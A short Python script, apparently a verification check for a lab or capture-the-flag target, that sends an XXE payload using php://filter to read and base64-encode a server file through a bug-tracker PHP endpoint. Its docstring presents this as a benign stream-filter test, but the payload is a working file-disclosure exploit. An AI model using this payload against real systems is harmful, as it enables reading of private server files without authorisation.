#!/usr/bin/env python3
"""Verify native PHP stream filtering on a public, non-sensitive fixture file."""
import base64
import urllib.parse
import urllib.request

xml = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE bugreport [<!ENTITY fixture SYSTEM '
    '"php://filter/convert.base64-encode/resource=/var/www/localhost/htdocs/resources/README.txt">]>'
    '<bugreport><title>Fixture Test</title><cwe>611</cwe><cvss>0</cvss>'
    '<reward>&fixture;</reward></bugreport>'
)
data = urllib.parse.urlencode({"data": base64.b64encode(xml.encode()).decode()}).encode()
with urllib.request.urlopen("http://bountyhunter-target/tracker_diRbPr00f314.php", data=data, timeout=10) as res:
    body = res.read().decode("utf-8", "replace")
assert base64.b64encode(b"Tasks:\n").decode().rstrip("=") in body, (
    "Expected the actual PHP stream filter to encode a harmless existing text fixture"
)
print("PASS: native PHP stream filter returns base64 of a benign text file", flush=True)
